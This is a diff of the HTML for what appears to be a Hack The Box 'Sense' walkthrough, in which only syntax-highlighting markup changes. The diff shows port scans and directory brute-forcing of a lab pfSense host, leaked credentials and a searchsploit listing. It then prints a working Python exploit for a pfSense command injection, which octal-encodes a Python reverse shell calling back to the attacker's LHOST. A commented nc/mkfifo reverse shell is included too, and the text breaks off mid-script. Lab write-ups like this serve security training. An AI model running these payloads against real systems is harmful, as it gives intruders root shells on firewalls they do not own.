@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<meta name="generator" content="Hugo 0.91.2" />
+<meta name="generator" content="Hugo 0.96.0" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
 <link rel="preload" href="https://alamot.github.io/css/noncrit.css" as="style" onload="this.rel='stylesheet'">
 <noscript><link rel="stylesheet" href="https://alamot.github.io/css/noncrit.css"></noscript>
@@ -304,127 +304,127 @@ if (language) {
 <h2 id="port-scanning">Port scanning</h2>
 
 <p>We scan the full range of TCP ports using masscan:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>sudo masscan -e tun0 -p0-65535 --max-rate <span class="m">500</span> 10.10.10.60
-<span class="go">Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2018-03-22 09:51:28 GMT
-</span><span class="go"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
-</span><span class="go">Initiating SYN Stealth Scan
-</span><span class="go">Scanning 1 hosts [65536 ports/host]
-</span><span class="go">Discovered open port 443/tcp on 10.10.10.60                                    
-</span><span class="go">Discovered open port 80/tcp on 10.10.10.60
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo masscan -e tun0 -p0-65535 --max-rate <span class="m">500</span> 10.10.10.60
+</span></span><span class="line"><span class="cl"><span class="go">Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2018-03-22 09:51:28 GMT
+</span></span></span><span class="line"><span class="cl"><span class="go"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+</span></span></span><span class="line"><span class="cl"><span class="go">Initiating SYN Stealth Scan
+</span></span></span><span class="line"><span class="cl"><span class="go">Scanning 1 hosts [65536 ports/host]
+</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 443/tcp on 10.10.10.60                                    
+</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 80/tcp on 10.10.10.60
+</span></span></span></code></pre></div></div></p>
 
 <p>We found TCP ports 80 and 443 open. Let&rsquo;s explore them using nmap:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>sudo nmap -A -p80,443 10.10.10.60
-<span class="err">
-</span><span class="err"></span><span class="go">Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-22 11:54 EET
-</span><span class="go">Nmap scan report for 10.10.10.60
-</span><span class="go">Host is up (0.091s latency).
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">PORT    STATE SERVICE  VERSION
-</span><span class="go">80/tcp  open  http     lighttpd 1.4.35
-</span><span class="go">|_http-server-header: lighttpd/1.4.35
-</span><span class="go">|_http-title: Did not follow redirect to https://10.10.10.60/
-</span><span class="go">443/tcp open  ssl/http lighttpd 1.4.35
-</span><span class="go">|_http-server-header: lighttpd/1.4.35
-</span><span class="go">|_http-title: Login
-</span><span class="go">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-</span><span class="go">Device type: general purpose|specialized
-</span><span class="go">Running (JUST GUESSING): OpenBSD 4.X (93%), Comau embedded (92%), Linux 2.6.X (89%)
-</span><span class="go">OS CPE: cpe:/o:openbsd:openbsd:4.0 cpe:/o:linux:linux_kernel:2.6.29
-</span><span class="go">Aggressive OS guesses: OpenBSD 4.0 (93%), Comau C4G robot control unit (92%), Linux 2.6.29 (89%), OpenBSD 4.3 (85%)
-</span><span class="go">No exact OS matches for host (test conditions non-ideal).
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo nmap -A -p80,443 10.10.10.60
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-22 11:54 EET
+</span></span></span><span class="line"><span class="cl"><span class="go">Nmap scan report for 10.10.10.60
+</span></span></span><span class="line"><span class="cl"><span class="go">Host is up (0.091s latency).
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">PORT    STATE SERVICE  VERSION
+</span></span></span><span class="line"><span class="cl"><span class="go">80/tcp  open  http     lighttpd 1.4.35
+</span></span></span><span class="line"><span class="cl"><span class="go">|_http-server-header: lighttpd/1.4.35
+</span></span></span><span class="line"><span class="cl"><span class="go">|_http-title: Did not follow redirect to https://10.10.10.60/
+</span></span></span><span class="line"><span class="cl"><span class="go">443/tcp open  ssl/http lighttpd 1.4.35
+</span></span></span><span class="line"><span class="cl"><span class="go">|_http-server-header: lighttpd/1.4.35
+</span></span></span><span class="line"><span class="cl"><span class="go">|_http-title: Login
+</span></span></span><span class="line"><span class="cl"><span class="go">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+</span></span></span><span class="line"><span class="cl"><span class="go">Device type: general purpose|specialized
+</span></span></span><span class="line"><span class="cl"><span class="go">Running (JUST GUESSING): OpenBSD 4.X (93%), Comau embedded (92%), Linux 2.6.X (89%)
+</span></span></span><span class="line"><span class="cl"><span class="go">OS CPE: cpe:/o:openbsd:openbsd:4.0 cpe:/o:linux:linux_kernel:2.6.29
+</span></span></span><span class="line"><span class="cl"><span class="go">Aggressive OS guesses: OpenBSD 4.0 (93%), Comau C4G robot control unit (92%), Linux 2.6.29 (89%), OpenBSD 4.3 (85%)
+</span></span></span><span class="line"><span class="cl"><span class="go">No exact OS matches for host (test conditions non-ideal).
+</span></span></span></code></pre></div></div></p>
 
 <h2 id="brute-forcing-directories-and-files">Brute forcing directories and files</h2>
 
 <p>There are multiple vulnerabilities for PfSense but we need an authenticated user to exploit most of them. Maybe we can find some credentials if we search for notes in text files:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>dirsearch -u https://10.10.10.60 -w /opt/DirBuster/directory-list-2.3-medium.txt -f -e txt
-<span class="err">
-</span><span class="err"></span><span class="go"> _|. _ _  _  _  _ _|_    v0.3.8
-</span><span class="go">(_||| _) (/_(_|| (_| )
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">Extensions: txt | Threads: 10 | Wordlist size: 441041
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">Target: https://10.10.10.60
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">[09:42:09] Starting: 
-</span><span class="go">[09:42:45] 200 -  271B  - /changelog.txt
-</span><span class="go">[09:43:42] 200 -    7KB - /tree/
-</span><span class="go">[09:45:52] 302 -    0B  - /installer/  -&gt;  installer.php
-</span><span class="go">[10:51:23] 200 -  106B  - /system-users.txt
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> dirsearch -u https://10.10.10.60 -w /opt/DirBuster/directory-list-2.3-medium.txt -f -e txt
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go"> _|. _ _  _  _  _ _|_    v0.3.8
+</span></span></span><span class="line"><span class="cl"><span class="go">(_||| _) (/_(_|| (_| )
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Extensions: txt | Threads: 10 | Wordlist size: 441041
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Target: https://10.10.10.60
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[09:42:09] Starting: 
+</span></span></span><span class="line"><span class="cl"><span class="go">[09:42:45] 200 -  271B  - /changelog.txt
+</span></span></span><span class="line"><span class="cl"><span class="go">[09:43:42] 200 -    7KB - /tree/
+</span></span></span><span class="line"><span class="cl"><span class="go">[09:45:52] 302 -    0B  - /installer/  -&gt;  installer.php
+</span></span></span><span class="line"><span class="cl"><span class="go">[10:51:23] 200 -  106B  - /system-users.txt
+</span></span></span></code></pre></div></div></p>
 
 <h1 id="finding-credentials">Finding credentials</h1>
 
 <p>Let&rsquo;s see the contents of <a href="https://10.10.10.60/system-users.txt:" target="_blank">https://10.10.10.60/system-users.txt:</a>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">####Support ticket###
-
-Please create the following user
-
-username: Rohit
-password: company defaults</code></pre></div></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">####Support ticket###
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Please create the following user
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">username: Rohit
+</span></span><span class="line"><span class="cl">password: company defaults</span></span></code></pre></div></p>
 
 <p>Let&rsquo;s google-search the default password for PfSense:</p>
 
 <p><a href="https://doc.pfsense.org/index.php/What_is_the_default_username_and_password" target="_blank">https://doc.pfsense.org/index.php/What_is_the_default_username_and_password</a>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">The default credentials for a pfSense firewall are:
-
-Username: admin
-Password: pfsense</code></pre></div></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">The default credentials for a pfSense firewall are:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Username: admin
+</span></span><span class="line"><span class="cl">Password: pfsense</span></span></code></pre></div></p>
 
 <p><a href="https://doc.pfsense.org/index.php/Installing_pfSense#pfSense_Default_Configuration" target="_blank">https://doc.pfsense.org/index.php/Installing_pfSense#pfSense_Default_Configuration</a>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">Default credentials are set to a username of admin with password pfsense</code></pre></div></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Default credentials are set to a username of admin with password pfsense</span></span></code></pre></div></p>
 
 <p>Therefore our credentials are rohit:pfsense.</p>
 
 <h1 id="getting-root">Getting root</h1>
 
 <p>Now, let&rsquo;s search for PfSense vulnerabilities:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>searchsploit pfsense -w
-<span class="go">--------------------------------------------------------------------------------
-</span><span class="go"> Exploit Title
-</span><span class="go">--------------------------------------------------------------------------------
-</span><span class="go">pfSense - &#39;interfaces.php?if&#39; Cross-Site Scripting
-</span><span class="go">    https://www.exploit-db.com/exploits/35071/
-</span><span class="go">pfSense - &#39;pkg.php?xml&#39; Cross-Site Scripting
-</span><span class="go">    https://www.exploit-db.com/exploits/35069/
-</span><span class="go">pfSense - &#39;pkg_edit.php?id&#39; Cross-Site Scripting
-</span><span class="go">    https://www.exploit-db.com/exploits/35068/
-</span><span class="go">pfSense - &#39;status_graph.php?if&#39; Cross-Site Scripting
-</span><span class="go">    https://www.exploit-db.com/exploits/35070/
-</span><span class="go">pfSense - Authenticated Group Member Remote Command Execution (Metasploit)
-</span><span class="go">    https://www.exploit-db.com/exploits/43193/
-</span><span class="go">pfSense 2 Beta 4 - &#39;graph.php&#39; Multiple Cross-Site Scripting Vulnerabilities
-</span><span class="go">    https://www.exploit-db.com/exploits/34985/
-</span><span class="go">pfSense 2.0.1 - Cross-Site Scripting / Cross-Site Request Forgery / RCE
-</span><span class="go">    https://www.exploit-db.com/exploits/23901/
-</span><span class="go">pfSense 2.1 build 20130911-1816 - Directory Traversal
-</span><span class="go">    https://www.exploit-db.com/exploits/31263/
-</span><span class="go">pfSense 2.2 - Multiple Vulnerabilities
-</span><span class="go">    https://www.exploit-db.com/exploits/36506/
-</span><span class="go">pfSense 2.2.5 - Directory Traversal
-</span><span class="go">    https://www.exploit-db.com/exploits/39038/
-</span><span class="go">pfSense 2.3.1_1 - Command Execution
-</span><span class="go">    https://www.exploit-db.com/exploits/43128/
-</span><span class="go">pfSense 2.3.2 - Cross-Site Scripting / Cross-Site Request Forgery
-</span><span class="go">    https://www.exploit-db.com/exploits/41501/
-</span><span class="go">pfSense Community Edition 2.2.6 - Multiple Vulnerabilities
-</span><span class="go">    https://www.exploit-db.com/exploits/39709/
-</span><span class="go">pfSense Firewall 2.2.5 - Config File Cross-Site Request Forgery
-</span><span class="go">    https://www.exploit-db.com/exploits/39306/
-</span><span class="go">pfSense Firewall 2.2.6 - Services Cross-Site Request Forgery
-</span><span class="go">    https://www.exploit-db.com/exploits/39695/
-</span><span class="go">pfSense UTM Platform 2.0.1 - Cross-Site Scripting
-</span><span class="go">    https://www.exploit-db.com/exploits/24439/
-</span><span class="go">--------------------------------------------------------------------------------
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> searchsploit pfsense -w
+</span></span><span class="line"><span class="cl"><span class="go">--------------------------------------------------------------------------------
+</span></span></span><span class="line"><span class="cl"><span class="go"> Exploit Title
+</span></span></span><span class="line"><span class="cl"><span class="go">--------------------------------------------------------------------------------
+</span></span></span><span class="line"><span class="cl"><span class="go">pfSense - &#39;interfaces.php?if&#39; Cross-Site Scripting
+</span></span></span><span class="line"><span class="cl"><span class="go">    https://www.exploit-db.com/exploits/35071/
+</span></span></span><span class="line"><span class="cl"><span class="go">pfSense - &#39;pkg.php?xml&#39; Cross-Site Scripting
+</span></span></span><span class="line"><span class="cl"><span class="go">    https://www.exploit-db.com/exploits/35069/
+</span></span></span><span class="line"><span class="cl"><span class="go">pfSense - &#39;pkg_edit.php?id&#39; Cross-Site Scripting
+</span></span></span><span class="line"><span class="cl"><span class="go">    https://www.exploit-db.com/exploits/35068/
+</span></span></span><span class="line"><span class="cl"><span class="go">pfSense - &#39;status_graph.php?if&#39; Cross-Site Scripting
+</span></span></span><span class="line"><span class="cl"><span class="go">    https://www.exploit-db.com/exploits/35070/
+</span></span></span><span class="line"><span class="cl"><span class="go">pfSense - Authenticated Group Member Remote Command Execution (Metasploit)
+</span></span></span><span class="line"><span class="cl"><span class="go">    https://www.exploit-db.com/exploits/43193/
+</span></span></span><span class="line"><span class="cl"><span class="go">pfSense 2 Beta 4 - &#39;graph.php&#39; Multiple Cross-Site Scripting Vulnerabilities
+</span></span></span><span class="line"><span class="cl"><span class="go">    https://www.exploit-db.com/exploits/34985/
+</span></span></span><span class="line"><span class="cl"><span class="go">pfSense 2.0.1 - Cross-Site Scripting / Cross-Site Request Forgery / RCE
+</span></span></span><span class="line"><span class="cl"><span class="go">    https://www.exploit-db.com/exploits/23901/
+</span></span></span><span class="line"><span class="cl"><span class="go">pfSense 2.1 build 20130911-1816 - Directory Traversal
+</span></span></span><span class="line"><span class="cl"><span class="go">    https://www.exploit-db.com/exploits/31263/
+</span></span></span><span class="line"><span class="cl"><span class="go">pfSense 2.2 - Multiple Vulnerabilities
+</span></span></span><span class="line"><span class="cl"><span class="go">    https://www.exploit-db.com/exploits/36506/
+</span></span></span><span class="line"><span class="cl"><span class="go">pfSense 2.2.5 - Directory Traversal
+</span></span></span><span class="line"><span class="cl"><span class="go">    https://www.exploit-db.com/exploits/39038/
+</span></span></span><span class="line"><span class="cl"><span class="go">pfSense 2.3.1_1 - Command Execution
+</span></span></span><span class="line"><span class="cl"><span class="go">    https://www.exploit-db.com/exploits/43128/
+</span></span></span><span class="line"><span class="cl"><span class="go">pfSense 2.3.2 - Cross-Site Scripting / Cross-Site Request Forgery
+</span></span></span><span class="line"><span class="cl"><span class="go">    https://www.exploit-db.com/exploits/41501/
+</span></span></span><span class="line"><span class="cl"><span class="go">pfSense Community Edition 2.2.6 - Multiple Vulnerabilities
+</span></span></span><span class="line"><span class="cl"><span class="go">    https://www.exploit-db.com/exploits/39709/
+</span></span></span><span class="line"><span class="cl"><span class="go">pfSense Firewall 2.2.5 - Config File Cross-Site Request Forgery
+</span></span></span><span class="line"><span class="cl"><span class="go">    https://www.exploit-db.com/exploits/39306/
+</span></span></span><span class="line"><span class="cl"><span class="go">pfSense Firewall 2.2.6 - Services Cross-Site Request Forgery
+</span></span></span><span class="line"><span class="cl"><span class="go">    https://www.exploit-db.com/exploits/39695/
+</span></span></span><span class="line"><span class="cl"><span class="go">pfSense UTM Platform 2.0.1 - Cross-Site Scripting
+</span></span></span><span class="line"><span class="cl"><span class="go">    https://www.exploit-db.com/exploits/24439/
+</span></span></span><span class="line"><span class="cl"><span class="go">--------------------------------------------------------------------------------
+</span></span></span></code></pre></div></div></p>
 
 <p>Check also this link: <a href="https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injection/" target="_blank">https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injection/</a></p>
 
 <p>Let&rsquo;s see <a href="https://www.exploit-db.com/exploits/39709/:" target="_blank">https://www.exploit-db.com/exploits/39709/:</a>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">The status_rrd_graph_img.php page is vulnerable to command injection via the graph GET parameter. A non-administrative authenticated attacker having access privileges to the graph status functionality can inject arbitrary operating system commands and execute them in the context of the root user. Although input validation is performed on the graph parameter through a regular expression filter, the pipe character is not removed. Octal characters sequences can be used to encode a payload, bypass the filter for illegal characters, and create a PHP file to download and execute a malicious file (i.e. reverse shell) from a remote attacker controlled host.</code></pre></div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="nf">GET</span> <span class="nn">/status_rrd_graph_img.php?database=-throughput.rrd&amp;graph=file|command|echo%20</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span></code></pre></div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="nf">GET</span> <span class="nn">/status_rrd_graph_img.php?database=-throughput.rrd&amp;graph=file|printf%20OCTET_ENCODED_SHELLCODE|sh|echo%20</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span></code></pre></div></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">The status_rrd_graph_img.php page is vulnerable to command injection via the graph GET parameter. A non-administrative authenticated attacker having access privileges to the graph status functionality can inject arbitrary operating system commands and execute them in the context of the root user. Although input validation is performed on the graph parameter through a regular expression filter, the pipe character is not removed. Octal characters sequences can be used to encode a payload, bypass the filter for illegal characters, and create a PHP file to download and execute a malicious file (i.e. reverse shell) from a remote attacker controlled host.</span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/status_rrd_graph_img.php?database=-throughput.rrd&amp;graph=file|command|echo%20</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span></span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/status_rrd_graph_img.php?database=-throughput.rrd&amp;graph=file|printf%20OCTET_ENCODED_SHELLCODE|sh|echo%20</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span></span></span></code></pre></div></p>
 
 <p>Unfortunately, the exploit 39709 is badly written and very messy as it mixes HTML, Javascript, PHP and Python for no reason. So, I wrote my own exploitation script in Python.</p>
 
@@ -433,106 +433,106 @@ Password: pfsense</code></pre></div></p>
 <p>Here is my script: <a href="https://github.com/Alamot/code-snippets/blob/master/hacking/HTB/Sense/autopwn_sense.py" target="_blank">https://github.com/Alamot/code-snippets/blob/master/hacking/HTB/Sense/autopwn_sense.py</a></p>
 
 <p>Don&rsquo;t forget to set LHOST appropriately.
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python2</span>
-<span class="c1"># Author: Alamot (Antonios Tsolis)</span>
-
-<span class="kn">import</span> <span class="nn">re</span>
-<span class="kn">import</span> <span class="nn">sys</span>
-<span class="kn">import</span> <span class="nn">time</span>
-<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="kn">import</span> <span class="nn">signal</span><span class="o">,</span> <span class="nn">thread</span>
-<span class="kn">import</span> <span class="nn">requests</span><span class="o">,</span> <span class="nn">urllib3</span>
-<span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">signal</span><span class="o">.</span><span class="n">SIG_DFL</span><span class="p">)</span>
-
-<span class="n">DEBUG</span> <span class="o">=</span> <span class="kc">False</span>
-<span class="n">RHOST</span><span class="o">=</span><span class="s2">&#34;10.10.10.60&#34;</span>
-<span class="n">RPORT</span><span class="o">=</span><span class="mi">443</span>
-<span class="n">LHOST</span><span class="o">=</span><span class="s2">&#34;10.10.15.128&#34;</span>
-<span class="n">LPORT</span><span class="o">=</span><span class="mi">60001</span>
-
-<span class="k">if</span> <span class="n">DEBUG</span><span class="p">:</span>
-    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
-<span class="k">else</span><span class="p">:</span>
-    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;info&#39;</span>
-
-<span class="k">def</span> <span class="nf">send_ptyshell_payload</span><span class="p">():</span>
-
-    <span class="c1"># This payload works too</span>
-    <span class="c1"># stager = &#34;rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc &#34; + str(LHOST) + &#34; &#34; + str(LPORT) + &#34; &gt; /tmp/f&#34;</span>
-
-    <span class="n">stager</span> <span class="o">=</span> <span class="s2">&#34;python -c </span><span class="se">\&#34;</span><span class="s2">import os, pty, socket; lhost = &#39;&#34;</span><span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">LHOST</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;&#39;; lport = &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">LPORT</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((lhost, lport)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); os.putenv(&#39;HISTFILE&#39;,&#39;/dev/null&#39;); pty.spawn(&#39;/bin/sh&#39;); s.close(); exit()</span><span class="se">\&#34;</span><span class="s2">&#34;</span>
-
-    <span class="n">encoded_stager</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
-    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">stager</span><span class="p">:</span>
-        <span class="n">encoded_stager</span> <span class="o">+=</span> <span class="s2">&#34;</span><span class="se">\\\\</span><span class="si">%03d</span><span class="s2">&#34;</span> <span class="o">%</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="nb">oct</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">))))</span>
-    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-
-    <span class="n">client</span> <span class="o">=</span> <span class="kc">None</span>
-    <span class="k">try</span><span class="p">:</span>
-        <span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">()</span>
-        <span class="n">client</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
-        <span class="n">client</span><span class="o">.</span><span class="n">verify</span> <span class="o">=</span> <span class="kc">False</span>
-        <span class="n">client</span><span class="o">.</span><span class="n">keep_alive</span> <span class="o">=</span> <span class="kc">False</span>
-
-        <span class="c1"># Retrieve the CSRF token first</span>
-        <span class="n">p1</span><span class="o">=</span><span class="n">log</span><span class="o">.</span><span class="n">progress</span><span class="p">(</span><span class="s2">&#34;Connecting to get csrf token&#34;</span><span class="p">)</span>
-        <span class="n">response</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;https://&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">RHOST</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;:&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">RPORT</span><span class="p">),</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
-        <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
-            <span class="n">p1</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s2">&#34;Status &#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="p">))</span>
-            <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
-        <span class="n">csrf</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;csrfMagicToken\s*=\s*&#34;(sid:\w+,\d+)&#39;</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-        <span class="n">p1</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;csrfMagicToken = &#34;</span> <span class="o">+</span> <span class="n">csrf</span><span class="p">)</span>
-
-        <span class="c1"># Login</span>
-        <span class="n">p2</span><span class="o">=</span><span class="n">log</span><span class="o">.</span><span class="n">progress</span><span class="p">(</span><span class="s2">&#34;Logging in&#34;</span><span class="p">)</span>
-        <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;__csrf_magic&#34;</span><span class="p">:</span><span class="n">csrf</span><span class="p">,</span> <span class="s2">&#34;usernamefld&#34;</span><span class="p">:</span><span class="s2">&#34;rohit&#34;</span><span class="p">,</span> <span class="s2">&#34;passwordfld&#34;</span><span class="p">:</span><span class="s2">&#34;pfsense&#34;</span><span class="p">,</span> <span class="s2">&#34;login&#34;</span><span class="p">:</span><span class="s2">&#34;Login&#34;</span><span class="p">}</span>
-        <span class="n">response</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&#34;https://&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">RHOST</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;:&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">RPORT</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;/index.php&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
-        <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
-            <span class="n">p1</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s2">&#34;Status &#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="p">))</span>
-            <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
-        <span class="n">p2</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Status &#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="p">))</span>
-
-        <span class="c1"># Send payload</span>
-        <span class="n">p3</span><span class="o">=</span><span class="n">log</span><span class="o">.</span><span class="n">progress</span><span class="p">(</span><span class="s2">&#34;Sending pty shell payload...&#34;</span><span class="p">)</span>
-        <span class="k">try</span><span class="p">:</span>
-            <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;database&#34;</span><span class="p">:</span><span class="s2">&#34;-throughput.rrd&#34;</span><span class="p">,</span> <span class="s2">&#34;graph&#34;</span><span class="p">:</span><span class="s2">&#34;file|printf &#34;</span><span class="o">+</span><span class="n">encoded_stager</span><span class="o">+</span><span class="s2">&#34;|sh|echo &#34;</span><span class="p">}</span>
-            <span class="n">response</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;https://&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">RHOST</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;:&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">RPORT</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;/status_rrd_graph_img.php&#34;</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
-            <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
-                <span class="n">p3</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s2">&#34;Status &#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="p">))</span>
